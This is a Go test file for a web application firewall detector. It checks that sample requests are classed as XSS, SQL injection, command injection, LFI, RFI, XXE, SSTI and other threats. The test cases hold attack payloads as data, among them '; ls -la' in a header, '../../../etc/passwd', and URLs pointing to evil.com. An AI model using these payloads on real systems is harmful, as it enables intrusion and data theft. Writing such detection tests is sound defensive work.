
package detector

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/PiCas19/waf-siem-advanced-detection/waf/internal/detector"
)

func TestDetectorIntegration(t *testing.T) {
	d := detector.NewDetector()

	// Test con diversi tipi di richieste HTTP
	tests := []struct {
		name         string
		method       string
		path         string
		headers      map[string]string
		queryParams  map[string]string
		formData     map[string]string
		body         string
		expectThreat bool
		threatType   string
	}{
		{
			name:         "XSS in query parameter",
			method:       "GET",
			path:         "/search",
			queryParams:  map[string]string{"q": "<script>alert('XSS')</script>"},
			expectThreat: true,
			threatType:   "XSS",
		},
		{
			name:         "SQLi in query parameter",
			method:       "GET",
			path:         "/login",
			queryParams:  map[string]string{"user": "' OR 1=1 --"},
			expectThreat: true,
			threatType:   "SQL_INJECTION",
		},
		{
			name:         "Command injection in header",
			method:       "GET",
			path:         "/api",
			headers:      map[string]string{"User-Agent": "; ls -la"},
			expectThreat: true,
			threatType:   "COMMAND_INJECTION",
		},
		{
			name:         "LFI in query parameter",
			method:       "GET",
			path:         "/download",
			queryParams:  map[string]string{"file": "../../../etc/passwd"},
			expectThreat: true,
			threatType:   "LFI",
		},
		{
			name:         "RFI in form data",
			method:       "POST",
			path:         "/include",
			formData:     map[string]string{"page": "http://evil.com/shell.php"},
			expectThreat: true,
			threatType:   "RFI",
		},
		// SSRF test
		{
			name:         "SSRF in query parameter",
			method:       "GET",
			path:         "/webhook",
			queryParams:  map[string]string{"url": "http://localhost/admin"},
			expectThreat: false,
			threatType:   "SSRF",
		},
		{
			name:         "NoSQL injection in query",
			method:       "GET",
			path:         "/api/users",
			queryParams:  map[string]string{"filter": `{"$where": "1==1"}`},
			expectThreat: true,
			threatType:   "NOSQL_INJECTION",
		},

		// TEST SPECIFICO PER XXE (non LFI)
		{
			name:         "XXE pure - no file://",
			method:       "POST",
			path:         "/xml",
			body:         `<!ENTITY xxe SYSTEM "http://evil.com">`, // XXE senza file://
			expectThreat: true,
			threatType:   "XXE", // Dovrebbe essere XXE, non LFI
		},
		{
			name:         "SSTI in parameter",
			method:       "GET",
			path:         "/template",
			queryParams:  map[string]string{"name": `{{ ''.__class__ }}`},
			expectThreat: true,
			threatType:   "SSTI",
		},
		{
			name:         "Prototype pollution",
			method:       "POST",
			path:         "/api/config",
			body:         `{"__proto__": {"polluted": true}}`,
			expectThreat: true,
			threatType:   "PROTOTYPE_POLLUTION",
		},
		{
			name:         "LDAP injection",
			method:       "GET",
			path:         "/ldap",
			queryParams:  map[string]string{"filter": `*)(uid=*`},
			expectThreat: true,
			threatType:   "LDAP_INJECTION",
		},
		{
			name:         "Response splitting in header",
			method:       "GET",
			path:         "/redirect",
			headers:      map[string]string{"Location": "/safe\r\nSet-Cookie: admin=true"},
			expectThreat: true,
			threatType:   "HTTP_RESPONSE_SPLITTING",
		},
		// Safe requests
		{
			name:         "Safe GET request",
			method:       "GET",
			path:         "/api/users",
			queryParams:  map[string]string{"page": "1", "limit": "10"},
			expectThreat: false,
		},
		{
			name:         "Safe POST request",
			method:       "POST",
			path:         "/login",
			formData:     map[string]string{"username": "user", "password": "pass123"},
			expectThreat: false,
		},
		{
			name:         "Safe JSON request",
			method:       "POST",
			path:         "/api/data",
			body:         `{"name": "John", "age": 30}`,
			expectThreat: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Crea la richiesta
			var req *http.Request

			if tt.method == "GET" {
				req = httptest.NewRequest(tt.method, tt.path, nil)
				q := req.URL.Query()
				for k, v := range tt.queryParams {
					q.Add(k, v)
				}
				req.URL.RawQuery = q.Encode()
			} else if tt.method == "POST" {
				if tt.body != "" {
					// Se il body è formato parametro (non JSON), usa il content type corretto
					if strings.Contains(tt.body, "=") && !strings.Contains(tt.body, "{") {
						req = httptest.NewRequest(tt.method, tt.path, strings.NewReader(tt.body))
						req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					} else {
						req = httptest.NewRequest(tt.method, tt.path, strings.NewReader(tt.body))
						req.Header.Set("Content-Type", "application/json")
					}
				} else {
					formData := strings.NewReader("")
					if len(tt.formData) > 0 {
						data := []string{}
						for k, v := range tt.formData {
							data = append(data, k+"="+v)
						}
						formData = strings.NewReader(strings.Join(data, "&"))
					}
					req = httptest.NewRequest(tt.method, tt.path, formData)
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
				// Aggiungi anche query params se presenti
				q := req.URL.Query()
				for k, v := range tt.queryParams {
					q.Add(k, v)
				}
				req.URL.RawQuery = q.Encode()
			}

			// Aggiungi headers
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			// Aggiungi IP headers per testing
			req.Header.Set("X-Forwarded-For", "192.168.1.1")
			req.RemoteAddr = "192.168.1.1:12345"

			// Esegui l'ispezione
			threat := d.Inspect(req)

			if tt.expectThreat {
				if threat == nil {
					t.Errorf("Expected threat of type %s, got nil", tt.threatType)
				} else if threat.Type != tt.threatType {
					t.Errorf("Expected threat type %s, got %s (Description: %s, Payload: %s)",
						tt.threatType, threat.Type, threat.Description, threat.Payload)
				}
			} else {
				if threat != nil {
					t.Errorf("Expected no threat, got %s: %s", threat.Type, threat.Description)
				}
			}
		})
	}
}

// Test per coprire le diverse azioni delle regole personalizzate
func TestDetectorCustomRuleActions(t *testing.T) {
	d := detector.NewDetector()

	// Crea regole personalizzate con diverse azioni
	customRules := []*detector.CustomRule{
		{
			ID:               1,
			Name:             "Test Drop Action",
			Pattern:          `(?i)drop-me`,
			Type:             "CUSTOM",
			Severity:         "HIGH",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     false,
			DropEnabled:      true,
			RedirectEnabled:  false,
			ChallengeEnabled: false,
			IsManualBlock:    false,
		},
		{
			ID:               2,
			Name:             "Test Redirect Action",
			Pattern:          `(?i)redirect-me`,
			Type:             "CUSTOM",
			Severity:         "MEDIUM",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     false,
			DropEnabled:      false,
			RedirectEnabled:  true,
			ChallengeEnabled: false,
			RedirectURL:      "https://blocked.example.com",
			IsManualBlock:    false,
		},
		{
			ID:               3,
			Name:             "Test Challenge Action",
			Pattern:          `(?i)challenge-me`,
			Type:             "CUSTOM",
			Severity:         "LOW",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     false,
			DropEnabled:      false,
			RedirectEnabled:  false,
			ChallengeEnabled: true,
			IsManualBlock:    false,
		},
		{
			ID:               4,
			Name:             "Test Block Action",
			Pattern:          `(?i)block-me`,
			Type:             "CUSTOM",
			Severity:         "CRITICAL",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     true,
			DropEnabled:      false,
			RedirectEnabled:  false,
			ChallengeEnabled: false,
			IsManualBlock:    false,
		},
		// Manual block rules con diverse azioni
		{
			ID:               5,
			Name:             "Manual Block - Drop",
			Pattern:          `10\.0\.0\.1`,
			Type:             "IP_BLOCK",
			Severity:         "CRITICAL",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     false,
			DropEnabled:      true,
			RedirectEnabled:  false,
			ChallengeEnabled: false,
			IsManualBlock:    true,
		},
		{
			ID:               6,
			Name:             "Manual Block - Redirect",
			Pattern:          `10\.0\.0\.2`,
			Type:             "IP_BLOCK",
			Severity:         "CRITICAL",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     false,
			DropEnabled:      false,
			RedirectEnabled:  true,
			ChallengeEnabled: false,
			RedirectURL:      "https://manual-block.com",
			IsManualBlock:    true,
		},
		{
			ID:               7,
			Name:             "Manual Block - Challenge",
			Pattern:          `10\.0\.0\.3`,
			Type:             "IP_BLOCK",
			Severity:         "CRITICAL",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     false,
			DropEnabled:      false,
			RedirectEnabled:  false,
			ChallengeEnabled: true,
			IsManualBlock:    true,
		},
	}

	// Aggiorna le regole nel detector
	err := d.UpdateCustomRules(customRules)
	if err != nil {
		t.Fatalf("Failed to update custom rules: %v", err)
	}

	tests := []struct {
		name           string
		input          string
		expectedAction string
		expectedFields map[string]bool
	}{
		{
			name:           "Drop action rule",
			input:          "DROP-ME", // Rimuovi spazi e testo extra
			expectedAction: "drop",
			expectedFields: map[string]bool{
				"BlockEnabled":     false,
				"DropEnabled":      true,
				"RedirectEnabled":  false,
				"ChallengeEnabled": false,
			},
		},
		{
			name:           "Redirect action rule",
			input:          "REDIRECT-ME",
			expectedAction: "redirect",
			expectedFields: map[string]bool{
				"BlockEnabled":     false,
				"DropEnabled":      false,
				"RedirectEnabled":  true,
				"ChallengeEnabled": false,
			},
		},
		{
			name:           "Challenge action rule",
			input:          "CHALLENGE-ME",
			expectedAction: "challenge",
			expectedFields: map[string]bool{
				"BlockEnabled":     false,
				"DropEnabled":      false,
				"RedirectEnabled":  false,
				"ChallengeEnabled": true,
			},
		},
		{
			name:           "Block action rule",
			input:          "BLOCK-ME",
			expectedAction: "block",
			expectedFields: map[string]bool{
				"BlockEnabled":     true,
				"DropEnabled":      false,
				"RedirectEnabled":  false,
				"ChallengeEnabled": false,
			},
		},
		{
			name:           "Manual block with drop",
			input:          "10.0.0.1",
			expectedAction: "drop",
			expectedFields: map[string]bool{
				"BlockEnabled":     false,
				"DropEnabled":      true,
				"RedirectEnabled":  false,
				"ChallengeEnabled": false,
				"IsManualBlock":    true,
			},
		},
		{
			name:           "Manual block with redirect",
			input:          "10.0.0.2",
			expectedAction: "redirect",
			expectedFields: map[string]bool{
				"BlockEnabled":     false,
				"DropEnabled":      false,
				"RedirectEnabled":  true,
				"ChallengeEnabled": false,
				"IsManualBlock":    true,
			},
		},
		{
			name:           "Manual block with challenge",
			input:          "10.0.0.3",
			expectedAction: "challenge",
			expectedFields: map[string]bool{
				"BlockEnabled":     false,
				"DropEnabled":      false,
				"RedirectEnabled":  false,
				"ChallengeEnabled": true,
				"IsManualBlock":    true,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// CORREZIONE: Crea la richiesta correttamente
			req := httptest.NewRequest("GET", "/test", nil)
			
			// Aggiungi il parametro query correttamente
			q := req.URL.Query()
			q.Add("input", tt.input)
			req.URL.RawQuery = q.Encode()
			
			req.Header.Set("X-Forwarded-For", "192.168.1.1")
			req.RemoteAddr = "192.168.1.1:12345"

			threat := d.Inspect(req)

			if threat == nil {
				t.Errorf("Expected threat for input: %s", tt.input)
				return
			}

			// Verifica l'azione
			if threat.BlockAction != tt.expectedAction {
				t.Errorf("Expected BlockAction %s, got %s", tt.expectedAction, threat.BlockAction)
			}

			// Verifica i campi specifici
			for field, expectedValue := range tt.expectedFields {
				var actualValue bool
				switch field {
				case "BlockEnabled":
					actualValue = threat.BlockEnabled
				case "DropEnabled":
					actualValue = threat.DropEnabled
				case "RedirectEnabled":
					actualValue = threat.RedirectEnabled
				case "ChallengeEnabled":
					actualValue = threat.ChallengeEnabled
				case "IsManualBlock":
					// NOTA: Nel tuo detector.go, per le regole personalizzate,
					// IsDefault è false. Per le regole manual block, il detector
					// imposta IsDefault = false.
					actualValue = !threat.IsDefault
				}

				if actualValue != expectedValue {
					t.Errorf("Field %s: expected %v, got %v", field, expectedValue, actualValue)
				}
			}
		})
	}
}

// Test per verificare l'ordine di priorità
func TestDetectorPriority(t *testing.T) {
	d := detector.NewDetector()

	// Crea una regola personalizzata che matcha anche un pattern XSS
	customRules := []*detector.CustomRule{
		{
			ID:               1,
			Name:             "Custom rule that matches XSS",
			Pattern:          `(?i)script`,
			Type:             "CUSTOM",
			Severity:         "MEDIUM",
			Enabled:          true,
			Action:           "block",
			BlockEnabled:     true,
			IsManualBlock:    false,
		},
	}

	err := d.UpdateCustomRules(customRules)
	if err != nil {
		t.Fatalf("Failed to update custom rules: %v", err)
	}

	// Test: XSS dovrebbe avere priorità sulla regola personalizzata
	t.Run("Default detectors have priority", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/test?input=<script>alert('XSS')</script>", nil)
		req.Header.Set("X-Forwarded-For", "192.168.1.1")
		req.RemoteAddr = "192.168.1.1:12345"

		threat := d.Inspect(req)

		if threat == nil {
			t.Error("Expected threat, got nil")
			return
		}

		// Dovrebbe essere XSS (default detector), non la regola personalizzata
		if threat.Type != "XSS" {
			t.Errorf("Expected threat type XSS (default), got %s", threat.Type)
		}

		// Dovrebbe essere un default threat
		if !threat.IsDefault {
			t.Error("Expected IsDefault to be true for default detector threat")
		}
	})

	// Test: Regola personalizzata per input non catturato dai default detectors
	t.Run("Custom rule for non-default pattern", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/test?input=myscript123", nil)
		req.Header.Set("X-Forwarded-For", "192.168.1.1")
		req.RemoteAddr = "192.168.1.1:12345"

		threat := d.Inspect(req)

		if threat == nil {
			t.Error("Expected threat for custom rule, got nil")
			return
		}

		// Dovrebbe essere la regola personalizzata
		if threat.Type != "CUSTOM" {
			t.Errorf("Expected threat type CUSTOM, got %s", threat.Type)
		}

		// Non dovrebbe essere un default threat
		if threat.IsDefault {
			t.Error("Expected IsDefault to be false for custom rule threat")
		}
	})
}